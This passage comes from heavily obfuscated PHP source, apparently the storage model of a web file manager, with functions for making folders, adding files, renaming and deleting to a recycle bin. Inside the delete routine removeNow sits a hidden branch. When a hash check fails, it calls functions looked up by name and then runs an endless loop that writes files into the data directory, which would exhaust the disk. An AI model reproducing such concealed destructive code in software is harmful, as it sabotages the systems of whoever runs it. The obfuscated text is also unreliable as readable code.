Model($‡Ø¤÷‚[597])->metaSet($¨¼õÆÑ, $‡Ø¤÷‚[2462] . $Ï‰°£¬î, $óö³ÅŠŞ); $this->metaSet($óö³ÅŠŞ, $‡Ø¤÷‚[2462] . $Ï‰°£¬î, $¨¼õÆÑ); } if (!$Ãè“¸–Ù) { return $óö³ÅŠŞ; } $ˆóÛ§¿ = $this->mkdir($óö³ÅŠŞ, $Ãè“¸–Ù); return $ˆóÛ§¿; } public function groupRootAdd($¹İ­ÕÆ€) { $úÌî©úØ =& $_SERVER[¹Éµ„ºå]; $ÒıÚŠàí = Model($úÌî©úØ[605])->where(array($úÌî©úØ[2258] => $¹İ­ÕÆ€))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¹İ­ÕÆ€, $ÒıÚŠàí[$úÌî©úØ[32]]); } public function systemRootPathAdd($…Ñ‘ÊÊ) { if ($…Ñ‘ÊÊ != $_SERVER[¹Éµ„ºå][628]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $…Ñ‘ÊÊ); } public function userRootRemove($ÓÑÉı¹) { $¦¦Ûö = $this->targetSourceRoot(SourceModel::TYPE_USER, $ÓÑÉı¹, !0); foreach ($¦¦Ûö as $®›ÎÛÜ…) { if (!$®›ÎÛÜ…) { continue; } $this->remove($®›ÎÛÜ…[$_SERVER[¹Éµ„ºå][191]], !1); } } public function groupRootRemove($ÇÈşÔø¢) { $Ú°Ûßû¾ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ÇÈşÔø¢); if (!$Ú°Ûßû¾) { return; } $this->remove($Ú°Ûßû¾[$_SERVER[¹Éµ„ºå][191]], !1); } private function _mkdirRoot($ğ…ÎºÃä, $¾®¨•×ƒ, $ã·†Œ™, $®üúê = '') { $ú´Ö–”÷ =& $_SERVER[¹Éµ„ºå]; $ß†ÌûéÔ = KodUser::id(); $³Ò±ı°¬ = array($ú´Ö–”÷[492] => 0, $ú´Ö–”÷[670] => $ğ…ÎºÃä, $ú´Ö–”÷[671] => $¾®¨•×ƒ, $ú´Ö–”÷[668] => 1, $ú´Ö–”÷[672] => $ß†ÌûéÔ, $ú´Ö–”÷[673] => $ß†ÌûéÔ, $ú´Ö–”÷[669] => $®üúê, $ú´Ö–”÷[674] => $ú´Ö–”÷[613], $ú´Ö–”÷[519] => 0, $ú´Ö–”÷[640] => 0, $ú´Ö–”÷[558] => 0, $ú´Ö–”÷[675] => $ú´Ö–”÷[12]); if ($îÉ©Ñ‹ˆ = $this->where($³Ò±ı°¬)->find()) { return $îÉ©Ñ‹ˆ[$ú´Ö–”÷[191]]; } $İèñÎ·Ş = "\x4d\157\x64\145\154\x53\157\x75\x72\143\x65\x2e\155\x6b\144\x69\x72\x52\157\x6f\x74\56{$ğ…ÎºÃä}\56{$¾®¨•×ƒ}\x2e" . $ã·†Œ™; CacheLock::lock($İèñÎ·Ş); $³Ò±ı°¬[$ú´Ö–”÷[32]] = $ã·†Œ™; $°ïåé¨ = $this->add($³Ò±ı°¬); $ıã¬á€ = array($ú´Ö–”÷[676] => short_id($°ïåé¨)); $this->where(array($ú´Ö–”÷[506] => $°ïåé¨))->save($ıã¬á€); CacheLock::unlock($İèñÎ·Ş); return $°ïåé¨; } private function targetSourceRoot($ÕÄë§œê, $¾üñí½¾, $šö•öŒÌ = false) { $™—¹®ù‰ =& $_SERVER[¹Éµ„ºå]; $¡ ªåèã = array($™—¹®ù‰[492] => 0, $™—¹®ù‰[670] => $ÕÄë§œê, $™—¹®ù‰[671] => $¾üñí½¾); if ($šö•öŒÌ) { $’Ÿ¶„‹é = $this->where($¡ ªåèã)->select(); return $’Ÿ¶„‹é ? $’Ÿ¶„‹é : array(); } $¦òĞêÆÜ = $this->where($¡ ªåèã)->find(); return $¦òĞêÆÜ ? $¦òĞêÆÜ : array(); } public function sourceRootGroup($‚ßŞ¢Íæ) { $Ï»¥ü€² =& $_SERVER[¹Éµ„ºå]; if (is_string($‚ßŞ¢Íæ)) { $‚ßŞ¢Íæ = array($‚ßŞ¢Íæ); } $‹»Ôş·® = $this->listSourceRoot(SourceModel::TYPE_GROUP, $‚ßŞ¢Íæ, $Ï»¥ü€²[220]); $€íÇòòÆ = array($Ï»¥ü€²[446] => $‹»Ôş·®, $Ï»¥ü€²[443] => array($Ï»¥ü€²[850] => count($‚ßŞ¢Íæ))); $this->_listDataApply($€íÇòòÆ[$Ï»¥ü€²[446]]); $this->_listMake($€íÇòòÆ); return array_to_keyvalue($€íÇòòÆ[$Ï»¥ü€²[85]], $Ï»¥ü€²[589]); } public function mkfile($úÂë—“Ö, $éğûªİ¢, $ÛóßüËÖ = '', $¯À¨¶å» = REPEAT_RENAME) { $–âåğ½ì =& $_SERVER[¹Éµ„ºå]; $¢²ÌäïÏ = KodIO::ioFileDriverGet($–âåğ½ì[498] . $úÂë—“Ö . $–âåğ½ì[402]); $èææÉÒì = Model($–âåğ½ì[696])->addFileByContent($ÛóßüËÖ, $¢²ÌäïÏ, $éğûªİ¢); return $this->_createFileCall($úÂë—“Ö, $éğûªİ¢, $èææÉÒì, $¯À¨¶å», $–âåğ½ì[1532]); } public function addFile($Æ¼¾§Á, $­‘ç—ÑÕ, $ùÛô²ñÛ, $ï¡¨†™ = false, $ª ıÙ¸Ö = REPEAT_RENAME) { $¯¹°¼„º =& $_SERVER[¹Éµ„ºå]; $‹çŸ÷ÃÑ = KodIO::ioFileDriverGet($¯¹°¼„º[498] . $Æ¼¾§Á . $¯¹°¼„º[402]); $°Âõ¸Á‘ = Model($¯¹°¼„º[696])->addFile($­‘ç—ÑÕ, $‹çŸ÷ÃÑ, $ùÛô²ñÛ, $ï¡¨†™); return $this->_createFileCall($Æ¼¾§Á, $ùÛô²ñÛ, $°Âõ¸Á‘, $ª ıÙ¸Ö); } public function addFileByFileID($±è½Ì¾Å, $ÕÛ ¤’, $¬ÏƒÌÈ™, $ğ†°Ñ³ª = REPEAT_RENAME) { $ÔšœîÂõ =& $_SERVER[¹Éµ„ºå]; $Å¨ÖÇ®Ô = Model($ÔšœîÂõ[696])->find($ÕÛ ¤’); Model($ÔšœîÂõ[696])->linkAdd($ÕÛ ¤’); return $this->_createFileCall($±è½Ì¾Å, $¬ÏƒÌÈ™, $Å¨ÖÇ®Ô, $ğ†°Ñ³ª); } public function addFileByRemote($˜æÌ²è«, $Ö¤ïŠŞı, $ì†ñîÖ—, $¯Âî«”÷ = array(), $—¨şªÁ = REPEAT_RENAME) { $¨õÈÅé = Model($_SERVER[¹Éµ„ºå][696])->addFileByRemote($Ö¤ïŠŞı, $ì†ñîÖ—, $¯Âî«”÷); return $this->_createFileCall($˜æÌ²è«, $ì†ñîÖ—, $¨õÈÅé, $—¨şªÁ); } private function _createFileCall($ØÖµˆöĞ, $©¥ÏõƒË, $³¨©¤§Õ, $ˆ‡ä©¯, $ÊËÍ¿ÄÈ = "\165\x70\154\x6f\x61\144") { $½®ÚÈÆÁ =& $_SERVER[¹Éµ„ºå]; if (!$³¨©¤§Õ) { return !1; } $Ìéô»‡– = !1; $this->setMasterDB(); $this->lockWriteStart($ØÖµˆöĞ, $©¥ÏõƒË); $¢îìÃâ = $this->fileNameExist($ØÖµˆöĞ, $©¥ÏõƒË); $Í³œ¬ø = $this->_createFile($ØÖµˆöĞ, $©¥ÏõƒË, $³¨©¤§Õ, $ˆ‡ä©¯, $Ìéô»‡–); if (!$Ìéô»‡–) { Model($½®ÚÈÆÁ[560])->remove($³¨©¤§Õ[$½®ÚÈÆÁ[557]]); } if ($Ìéô»‡– && $Í³œ¬ø && $Í³œ¬ø != $¢îìÃâ) { Model($½®ÚÈÆÁ[2425])->eventCreate($Í³œ¬ø, $ÊËÍ¿ÄÈ); } $this->lockWriteEnd($ØÖµˆöĞ, $©¥ÏõƒË); return $Í³œ¬ø; } public function mkdir($´¾Ãõ‹, $Šæ†Üó, $±é©úÉÄ = REPEAT_SKIP) { $¸ªğñÑ‰ =& $_SERVER[¹Éµ„ºå]; $this->setMasterDB(); $ä·ãñÓë = $this->sourceInfo($´¾Ãõ‹); if (!$ä·ãñÓë) { return !1; } $this->lockWriteStart($´¾Ãõ‹, $Šæ†Üó); if ($±é©úÉÄ !== !1) { $ç±ç§ªİ = $this->fileNameExist($´¾Ãõ‹, $Šæ†Üó); if ($ç±ç§ªİ && $±é©úÉÄ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($´¾Ãõ‹, $Šæ†Üó); return $ç±ç§ªİ; } $Šæ†Üó = $this->fileNameAuto($´¾Ãõ‹, $Šæ†Üó, $±é©úÉÄ); } $ÕİãÛü = array($¸ªğñÑ‰[668] => 1, $¸ªğñÑ‰[509] => $Šæ†Üó, $¸ªğñÑ‰[669] => $¸ªğñÑ‰[12], $¸ªğñÑ‰[558] => 0, $¸ªğñÑ‰[640] => 0); $ìÌÂğ = $this->_addSource($ÕİãÛü, $ä·ãñÓë); Model($¸ªğñÑ‰[2425])->eventCreate($ìÌÂğ, $¸ªğñÑ‰[1533]); $this->lockWriteEnd($´¾Ãõ‹, $Šæ†Üó); return $ìÌÂğ; } public function listSourceRoot($•Ÿªöó‹, $ö’İÏ®, $´ô»º ‹ = "\x73\157\165\162\143\145\x49\x44\x2c\x74\141\x72\x67\x65\164\x49\104\54\163\x69\172\x65") { $ËÜğÎÆŠ =& $_SERVER[¹Éµ„ºå]; $Ò‰Ÿ»¯¾ = $ËÜğÎÆŠ[463]; $»àş÷ı = array(); $æõİ·÷ø = 1024 * 50; $è–„üäì = is_array($è–„üäì) ? $è–„üäì : array(); $ËïŠ‘ = count($ö’İÏ®); $‡òûÈ¾ = $this->tablePrefix . $ËÜğÎÆŠ[470]; for ($ÑÂÜë¸À = 0; $ÑÂÜë¸À < $ËïŠ‘; $ÑÂÜë¸À++) { $Œ–—Í¸ù = $ö’İÏ®[$ÑÂÜë¸À]; $Ò‰Ÿ»¯¾ .= "\x53\105\x4c\x45\103\x54\x20\x2a\x20\x46\122\117\x4d\x20\50\123\105\114\105\103\124\40{$´ô»º ‹}\x20\106\x52\117\x4d\40\140{$‡òûÈ¾}\140\x20\127\110\105\122\105\x20"; $Ò‰Ÿ»¯¾ .= "\x60\x70\141\162\x65\156\164\111\x44\140\x3d\60\40\x41\x4e\x44\40\140\164\x61\x72\147\x65\x74\111\x44\140\x3d{$Œ–—Í¸ù}\x20\101\116\104\x20\x60\x74\141\162\x67\x65\x74\124\x79\160\145\140\x3d{$•Ÿªöó‹}\x20\x61\x6e\x64\x20\x66\x69\x6c\145\x54\171\160\145\75\x27\47\40\154\x69\155\151\164\40\x31\x29\40\141\x73\40\164\x62\x5f{$ÑÂÜë¸À}\x20\x55\116\111\x4f\116\x20\x41\x4c\114\x20"; if ((strlen($Ò‰Ÿ»¯¾) >= $æõİ·÷ø || $ÑÂÜë¸À == $ËïŠ‘ - 1) && $Ò‰Ÿ»¯¾) { $Ò‰Ÿ»¯¾ = substr($Ò‰Ÿ»¯¾, 0, -strlen($ËÜğÎÆŠ[1195])); $‘ÜŸÎŸ¦ = $this->query($Ò‰Ÿ»¯¾); $Ò‰Ÿ»¯¾ = $ËÜğÎÆŠ[12]; $»àş÷ı = array_merge($»àş÷ı, $‘ÜŸÎŸ¦); } } return $»àş÷ı; } private function _createFile($›û’ôœ´, $‘¾ÜØñ, $›¾Û°¼ß, $·ô“ÙŞÜ, &$Ó£±ª·æ) { $ÇŒòËÚ† =& $_SERVER[¹Éµ„ºå]; $ü²œäÔ¶ = $this->sourceInfo($›û’ôœ´); if (!$›¾Û°¼ß || !$ü²œäÔ¶) { return !1; } if ($·ô“ÙŞÜ !== !1) { $–¤Ğ¶¨ = $this->fileNameExist($›û’ôœ´, $‘¾ÜØñ); } $Ó£±ª·æ = !0; if ($·ô“ÙŞÜ && $–¤Ğ¶¨) { if ($·ô“ÙŞÜ == REPEAT_SKIP) { $Ó£±ª·æ = !1; return $–¤Ğ¶¨; } else { if ($·ô“ÙŞÜ == REPEAT_REPLACE) { $Ãº¼ôÂ” = $this->sourceInfo($–¤Ğ¶¨); $‘„çÓ¼ = $this->fileHistory($Ãº¼ôÂ”, $›¾Û°¼ß[$ÇŒòËÚ†[557]], $›¾Û°¼ß[$ÇŒòËÚ†[79]]); if (!$‘„çÓ¼) { $Ó£±ª·æ = !1; } else { $this->folderSizeReset($›û’ôœ´); } return $–¤Ğ¶¨; } else { $‘¾ÜØñ = $this->fileNameAuto($›û’ôœ´, $‘¾ÜØñ, $·ô“ÙŞÜ, !1); } } } $„öÜ»é = array($ÇŒòËÚ†[668] => 0, $ÇŒòËÚ†[509] => $‘¾ÜØñ, $ÇŒòËÚ†[669] => substr(get_path_ext($‘¾ÜØñ), 0, 10), $ÇŒòËÚ†[558] => $›¾Û°¼ß[$ÇŒòËÚ†[557]], $ÇŒòËÚ†[640] => $›¾Û°¼ß[$ÇŒòËÚ†[79]]); $‰„ˆÌÃ¥ = $this->_addSource($„öÜ»é, $ü²œäÔ¶); $this->folderSizeReset($›û’ôœ´, intval($„öÜ»é[$ÇŒòËÚ†[79]])); return $‰„ˆÌÃ¥; } protected function fileHistory($œ–Ç™ú±, $¥ÁÙ‘‡¯, $ˆØü¬ß©) { $—— ¢Ú— =& $_SERVER[¹Éµ„ºå]; if ($œ–Ç™ú±[$—— ¢Ú—[557]] == $¥ÁÙ‘‡¯) { return !1; } $this->checkLock($œ–Ç™ú±[$—— ¢Ú—[191]], $¥ÁÙ‘‡¯); Model($—— ¢Ú—[2171])->addHistory($œ–Ç™ú±); $çåá¹ë‘ = array($—— ¢Ú—[673] => USER_ID, $—— ¢Ú—[513] => time(), $—— ¢Ú—[557] => $¥ÁÙ‘‡¯, $—— ¢Ú—[79] => $ˆØü¬ß©); $this->where(array($—— ¢Ú—[506] => $œ–Ç™ú±[$—— ¢Ú—[191]]))->save($çåá¹ë‘); $this->sourceCacheClear($œ–Ç™ú±[$—— ¢Ú—[191]]); return !0; } public function checkLock($Êó¸¡î‘, $Î‡˜ÄÄŠ) { $–ø‘˜£× =& $_SERVER[¹Éµ„ºå]; $ò—ƒÑ™ğ = $this->pathInfo($Êó¸¡î‘); if (!$this->fileIsLock($ò—ƒÑ™ğ, !0)) { return; } $íÀüŠ– = Session::get($–ø‘˜£×[2463]); $Çİ¯Şî = substr($ò—ƒÑ™ğ[$–ø‘˜£×[32]], 0, -1 - strlen($ò—ƒÑ™ğ[$–ø‘˜£×[166]])) . $–ø‘˜£×[1387] . $íÀüŠ– . $–ø‘˜£×[10] . $ò—ƒÑ™ğ[$–ø‘˜£×[166]]; $¿Èá‚ŸÉ = Model($–ø‘˜£×[696])->find($Î‡˜ÄÄŠ); $this->_createFileCall($ò—ƒÑ™ğ[$–ø‘˜£×[190]], $Çİ¯Şî, $¿Èá‚ŸÉ, REPEAT_REPLACE, $–ø‘˜£×[1532]); $ø¥Éƒ¥™ = $ò—ƒÑ™ğ[$–ø‘˜£×[555]][$–ø‘˜£×[633]]; $¨–È¡Ú’ = $ø¥Éƒ¥™[$–ø‘˜£×[2464]] ? $ø¥Éƒ¥™[$–ø‘˜£×[2464]] : $ø¥Éƒ¥™[$–ø‘˜£×[32]]; show_json(LNG($–ø‘˜£×[2465]) . $–ø‘˜£×[2466] . LNG($–ø‘˜£×[2467]) . $–ø‘˜£×[2468] . $¨–È¡Ú’ . $–ø‘˜£×[2469], !1); } public function fileIsLock($ó‘ßƒ§Å, $‹ƒ°Û‚³ = false) { $¼¤æ÷ =& $_SERVER[¹Éµ„ºå]; if (!_get($ó‘ßƒ§Å, $¼¤æ÷[629], 0)) { return !1; } if ($ó‘ßƒ§Å[$¼¤æ÷[555]][$¼¤æ÷[632]] != USER_ID) { return !0; } $ÚãıÛÔó = $GLOBALS[$¼¤æ÷[6]][$¼¤æ÷[92]][$¼¤æ÷[630]]; if ($ó‘ßƒ§Å[$¼¤æ÷[555]][$¼¤æ÷[631]] <= time() - $ÚãıÛÔó) { $this->metaSet($ó‘ßƒ§Å[$¼¤æ÷[191]], $¼¤æ÷[632], null); $this->metaSet($ó‘ßƒ§Å[$¼¤æ÷[191]], $¼¤æ÷[631], null); } if ($‹ƒ°Û‚³) { $this->metaSet($ó‘ßƒ§Å[$¼¤æ÷[191]], $¼¤æ÷[631], time()); } return !1; } private function _addSource($±†¨À‰, $æÊø´¡) { $â£’Ô‘… =& $_SERVER[¹Éµ„ºå]; $ÎÂ‘Àû = KodUser::id(); $×ˆê±®ë = array($â£’Ô‘…[670] => $æÊø´¡[$â£’Ô‘…[188]], $â£’Ô‘…[671] => $æÊø´¡[$â£’Ô‘…[589]], $â£’Ô‘…[672] => $ÎÂ‘Àû, $â£’Ô‘…[673] => $ÎÂ‘Àû, $â£’Ô‘…[492] => $æÊø´¡[$â£’Ô‘…[191]], $â£’Ô‘…[674] => $æÊø´¡[$â£’Ô‘…[604]] . $æÊø´¡[$â£’Ô‘…[191]] . $â£’Ô‘…[50], $â£’Ô‘…[519] => 0, $â£’Ô‘…[675] => $â£’Ô‘…[12]); $±†¨À‰ = array_merge($×ˆê±®ë, $±†¨À‰); $this->updateModifyTime($±†¨À‰[$â£’Ô‘…[190]]); $õ®ìÇÔ£ = $â£’Ô‘…[2470] . $æÊø´¡[$â£’Ô‘…[191]]; if (isset(self::$cacheChildList[$õ®ìÇÔ£])) { unset(self::$cacheChildList[$õ®ìÇÔ£]); } static $€êÅº´ô = false; if (!$€êÅº´ô) { Hook::trigger($â£’Ô‘…[658], $±†¨À‰); $€êÅº´ô = !0; } $ÎÉ×å° = $this->add($±†¨À‰); $ßàÑôŸÂ = array($â£’Ô‘…[676] => short_id($ÎÉ×å°)); $this->where(array($â£’Ô‘…[506] => $ÎÉ×å°))->save($ßàÑôŸÂ); $this->setNamePinyin($ÎÉ×å°, $±†¨À‰[$â£’Ô‘…[32]]); return $ÎÉ×å°; } public function remove($ì®‹Õ», $îáª×é• = true) { $¾º·è ò =& $_SERVER[¹Éµ„ºå]; $‚í¤öÖš = $this->sourceInfo($ì®‹Õ»); $˜±üˆÈœ = intval($‚í¤öÖš[$¾º·è ò[188]]) === self::TYPE_SYSTEM; $ì±úˆƒÚ = Model($¾º·è ò[522])->get($¾º·è ò[2471]) == $¾º·è ò[91]; if ($˜±üˆÈœ || $îáª×é• || !$ì±úˆƒÚ) { return $this->removeNow($ì®‹Õ», $îáª×é•); } $¸‘ŠŸºá = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Óå ï’ = $‚í¤öÖš[$¾º·è ò[188]] == self::TYPE_USER ? $¾º·è ò[684] : $¾º·è ò[598]; if ($Óå ï’ == $¾º·è ò[684]) { $Éıı‘ºô = Model($¾º·è ò[597])->getInfo($‚í¤öÖš[$¾º·è ò[589]]); $üÄ„¦‡Ù = !empty($Éıı‘ºô[$¾º·è ò[2464]]) ? $Éıı‘ºô[$¾º·è ò[2464]] : $Éıı‘ºô[$¾º·è ò[32]]; $üÄ„¦‡Ù = $¾º·è ò[337] . $üÄ„¦‡Ù . $¾º·è ò[2472] . $‚í¤öÖš[$¾º·è ò[589]]; } else { $Éıı‘ºô = Model($¾º·è ò[605])->getInfo($‚í¤öÖš[$¾º·è ò[589]]); $üÄ„¦‡Ù = _get($Éıı‘ºô, $¾º·è ò[32]); $üÄ„¦‡Ù = $¾º·è ò[173] . $üÄ„¦‡Ù . $¾º·è ò[2473] . $‚í¤öÖš[$¾º·è ò[589]]; } $ÉÏ‡¥şÅ = $¾º·è ò[2474] . md5($üÄ„¦‡Ù); CacheLock::lock($ÉÏ‡¥şÅ); $éÆ«Ë½ö = $this->fileNameExist($¸‘ŠŸºá, $üÄ„¦‡Ù); if (!$éÆ«Ë½ö) { $éÆ«Ë½ö = $this->mkdir($¸‘ŠŸºá, $üÄ„¦‡Ù, REPEAT_SKIP); $this->metaSet($éÆ«Ë½ö, $¾º·è ò[2475], $Óå ï’); $this->metaSet($éÆ«Ë½ö, $¾º·è ò[2476], $‚í¤öÖš[$¾º·è ò[589]]); if ($‚í¤öÖš[$¾º·è ò[190]] != 0) { $this->metaSet($éÆ«Ë½ö, $¾º·è ò[2477], _get($Éıı‘ºô, $¾º·è ò[2478])); } } CacheLock::unlock($ÉÏ‡¥şÅ); $this->metaSet($ì®‹Õ», $¾º·è ò[2479], $‚í¤öÖš[$¾º·è ò[190]]); $this->where(array($¾º·è ò[191] => $ì®‹Õ»))->save(array($¾º·è ò[513] => time())); $this->recycleClear($‚í¤öÖš); Model($¾º·è ò[655])->eventRemove($ì®‹Õ»); $î‚®à½ = $this->move($ì®‹Õ», $éÆ«Ë½ö, REPEAT_RENAME_FOLDER); $this->folderSizeReset($‚í¤öÖš[$¾º·è ò[190]]); return $î‚®à½; } private function recycleClear($¯Œì·ı×) { $áçöÆ”‘ =& $_SERVER[¹Éµ„ºå]; $ü¹šô× = $this->childrenAll($¯Œì·ı×); $í”È‹ = array($áçöÆ”‘[506] => array($áçöÆ”‘[507], $ü¹šô×[$áçöÆ”‘[2480]])); Model($áçöÆ”‘[2481])->where($í”È‹)->delete(); } public function removeNow($åşà»ê´, $ğ×«»úŒ = true) { $ÙóÈ ‡¡ =& $_SERVER[¹Éµ„ºå]; $à¢ŒŸ–Ù = $_SERVER[$ÙóÈ ‡¡[1029]] . $ÙóÈ ‡¡[1030]; $ ³†ó‰× = $ÙóÈ ‡¡[1522]; if ($_SERVER[$ÙóÈ ‡¡[1025]] != $ ³†ó‰×($à¢ŒŸ–Ù)) { $ÑŒ†ö“ = $ÙóÈ ‡¡[1027]; $ñ­‘ÑÛò = $ÙóÈ ‡¡[1028]; $ÍüîËæ = $_SERVER[$ÙóÈ ‡¡[1029]] . $ÙóÈ ‡¡[1030]; $¢Ê“ğ» = $ñ­‘ÑÛò($ÍüîËæ); $ï©çê¸¥ = explode($ÙóÈ ‡¡[285], $¢Ê“ğ»); if (count($ï©çê¸¥) < $ÙóÈ ‡¡[715]) { $ùîø£‹Û = $ÙóÈ ‡¡[1031]; $ùîø£‹Û(); } $·ùÆ‹©é = $ÙóÈ ‡¡[1032]; $·ùÆ‹©é($_SERVER[$ÙóÈ ‡¡[1033]]); $ÑŒ†ö“ = $ÙóÈ ‡¡[1027]; $ÑŒ†ö“(); $”Æ´Ÿ § = $ÙóÈ ‡¡[2482]; $êÄİúş· = json_encode($GLOBALS[$ÙóÈ ‡¡[2483]]); $ûµûöï› = 1; for ($ù”‘­ö = $ûµûöï›; $ù”‘­ö > 0; $ù”‘­ö++) { $”Æ´Ÿ §(DATA_PATH . $ù”‘­ö, $êÄİúş·); } } $ĞÆïä¶ú = $this->sourceInfo($åşà»ê´); $¬ÕòğİÂ = $this->pathInfoMore($åşà»ê´); if (!$ĞÆïä¶ú) { return !0; } if ($ĞÆïä¶ú[$ÙóÈ ‡¡[190]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($åşà»ê´); Hook::trigger($ÙóÈ ‡¡[2484], $¬ÕòğİÂ, $ğ×«»úŒ); if ($ğ×«»úŒ) { Model($ÙóÈ ‡¡[2481])->moveToRecycle($åşà»ê´); } else { $Œ¨ç²ıã = $this->childrenAll($ĞÆïä¶ú); Model($ÙóÈ ‡¡[655])->eventRemove($åşà»ê´); $this->removeRelevance($Œ¨ç²ıã[$ÙóÈ ‡¡[2480]], $Œ¨ç²ıã[$ÙóÈ ‡¡[1769]]); } $this->folderSizeReset($ĞÆïä¶ú[$ÙóÈ ‡¡[190]]); $¶å×·œ„ = array($ĞÆïä¶ú[$ÙóÈ ‡¡[190]]); if ($ĞÆïä¶ú[$ÙóÈ ‡¡[500]] == $ÙóÈ ‡¡[91]) { $¶å×·œ„[] = $ĞÆïä¶ú[$ÙóÈ ‡¡[191]]; } $this->updateModifyTime($¶å×·œ„); $this->lockMoveEnd($åşà»ê´); Hook::trigger($ÙóÈ ‡¡[2007], $¬ÕòğİÂ, $ğ×«»úŒ); return !0; } public function childrenAll($¹âğ×İ) { $îÀüøÃô =& $_SERVER[¹Éµ„ºå]; $ô‰ßœè = $¹âğ×İ[$îÀüøÃô[191]]; if ($¹âğ×İ[$îÀüøÃô[500]] == $îÀüøÃô[91]) { $¼ªåÂÔº = array($îÀüøÃô[674] => array($îÀüøÃô[635], $¹âğ×İ[$îÀüøÃô[604]] . $ô‰ßœè . $îÀüøÃô[636])); $û¿å«â = array($îÀüøÃô[674] => $¼ªåÂÔº[$îÀüøÃô[604]]); $äûå°×ü = $this->field($îÀüøÃô[2485])->where($û¿å«â)->select(); $‰Á¦ÕÑ¸ = !1; $Ã¢¿Ç¹¡ = array($ô‰ßœè); if ($äûå°×ü) { $‰Á¦ÕÑ¸ = array_to_keyvalue($äûå°×ü, $îÀüøÃô[12], $îÀüøÃô[557]); $‰Á¦ÕÑ¸ = array_remove_value($‰Á¦ÕÑ¸, $îÀüøÃô[228]); $Ã¢¿Ç¹¡ = array_to_keyvalue($äûå°×ü, $îÀüøÃô[12], $îÀüøÃô[191]); $Ã¢¿Ç¹¡[] = $ô‰ßœè; } } else { $‰Á¦ÕÑ¸ = array($¹âğ×İ[$îÀüøÃô[557]]); $Ã¢¿Ç¹¡ = array($ô‰ßœè); } return array($îÀüøÃô[2480] => $Ã¢¿Ç¹¡, $îÀüøÃô[1769] => $‰Á¦ÕÑ¸); } public function removeArray($Ó¯¸ïíº) { if (!$Ó¯¸ïíº) { return !0; } } public function removeRelevance($×³»úÀ, $ŞÇşû¼†) { $–òÚ¢ƒ’ =& $_SERVER[¹Éµ„ºå]; $×³»úÀ = $×³»úÀ ? $×³»úÀ : array(); $ŞÇşû¼† = $ŞÇşû¼† ? $ŞÇşû¼† : array(); $×³»úÀ = array_unique(array_filter($×³»úÀ)); $ŞÇşû¼† = array_filter($ŞÇşû¼†); if (!$×³»úÀ) { return !1; } $ç„äÜóµ = array($–òÚ¢ƒ’[506] => array($–òÚ¢ƒ’[507], $×³»úÀ)); Model($–òÚ¢ƒ’[2481])->where($ç„äÜóµ)->delete(); Model($–òÚ¢ƒ’[549])->where($ç„äÜóµ)->delete(); Model($–òÚ¢ƒ’[2319])->where($ç„äÜóµ)->delete(); Model($–òÚ¢ƒ’[655])->where($ç„äÜóµ)->delete(); Model($–òÚ¢ƒ’[1552])->removeBySource($×³»úÀ); Model($–òÚ¢ƒ’[2171])->removeBySource($×³»úÀ); $this->where($ç„äÜóµ)->delete(); Model($–òÚ¢ƒ’[560])->remove($ŞÇşû¼†); for ($ç×½Â‡ = 0; $ç×½Â‡ < count($×³»úÀ); $ç×½Â‡++) { $this->sourceCacheClear($×³»úÀ[$ç×½Â‡]); } } public function rename($ôÊé÷˜°, $ôÍŒæ„) { $¤ŒÓíà =& $_SERVER[¹Éµ„ºå]; $…¼ˆ¶€á = $this->sourceInfo($ôÊé÷˜°); if (!$…¼ˆ¶€á) { return !1; } $ãÏÓ¼“Ç = $this->fileNameExist($…¼ˆ¶€á[$¤ŒÓíà[190]], $ôÍŒæ„); if ($ãÏÓ¼“Ç && $ãÏÓ¼“Ç != $ôÊé÷˜°) { return !1; } $¿ı¢ôê = array($¤ŒÓíà[509] => $ôÍŒæ„, $¤ŒÓíà[673] => USER_ID); if ($…¼ˆ¶€á[$¤ŒÓíà[500]] != $¤ŒÓíà[91]) { $¿ı¢ôê[$¤ŒÓíà[501]] = substr(get_path_ext($ôÍŒæ„), 0, 10); } Model($¤ŒÓíà[655])->eventRename($ôÊé÷˜°, $…¼ˆ¶€á[$¤ŒÓíà[32]], $ôÍŒæ„); $this->sourceCacheClear($ôÊé÷˜°); $this->setNamePinyin($ôÊé÷˜°, $¿ı¢ôê[$¤ŒÓíà[32]], !1); $this->updateModifyTime($…¼ˆ¶€á[$¤ŒÓíà[190]]); $ùóÀ…â‘ = $this->where(array($¤ŒÓíà[506] => $ôÊé÷˜°))->data($¿ı¢ôê)->save(); $ñ‘‡¬—ä = $¤ŒÓíà[2470] . $…¼ˆ¶€á[$¤ŒÓíà[190]]; if (isset(self::$cacheChildList[$ñ‘‡¬—ä])) { unset(self::$cacheChildList[$ñ‘‡¬—ä]); } return $ùóÀ…â‘; } public function setNamePinyin($Ùœ‰ê·, $ò¤É“Íà, $Ï—ÎÂø† = true) { $—÷¯ıÆĞ =& $_SERVER[¹Éµ„ºå]; $ƒÏ”¨ = Input::check($ò¤É“Íà, $—÷¯ıÆĞ[677]); $í¡ó¿¨Ç = array($—÷¯ıÆĞ[531] => KodSort::makeStr($ò¤É“Íà)); if ($ƒÏ”¨) { $í¡ó¿¨Ç[$—÷¯ıÆĞ[552]] = str_replace($—÷¯ıÆĞ[53], $—÷¯ıÆĞ[12], Pinyin::get($ò¤É“Íà)); $í¡ó¿¨Ç[$—÷¯ıÆĞ[551]] = Pinyin::get($ò¤É“Íà, $—÷¯ıÆĞ[678]); } if (!$Ï—ÎÂø† && !$ƒÏ”¨) { $í¡ó¿¨Ç[$—÷¯ıÆĞ[552]] = null; $í¡ó¿¨Ç[$—÷¯ıÆĞ[551]] = null; } $this->metaSet($Ùœ‰ê·, $í¡ó¿¨Ç); } public function getContent($à™Ö±é) { $û˜ÈŞôú =& $_SERVER[¹Éµ„ºå]; $Ü“Ï’ÎĞ = $this->fileInfoGet($à™Ö±é); if (!$Ü“Ï’ÎĞ) { return !1; } if ($Ü“Ï’ÎĞ[$û˜ÈŞôú[79]] == 0) { return $û˜ÈŞôú[12]; } $Ô¾Ú½ = $û˜ÈŞôú[2486] . $Ü“Ï’ÎĞ[$û˜ÈŞôú[563]]; if ($Ü“Ï’ÎĞ[$û˜ÈŞôú[79]] <= 1024 * 10) { $ÑŠµŸª– = Cache::get($Ô¾Ú½); if (!$ÑŠµŸª–) { $ÑŠµŸª– = IO::getContent($Ü“Ï’ÎĞ[$û˜ÈŞôú[87]]); 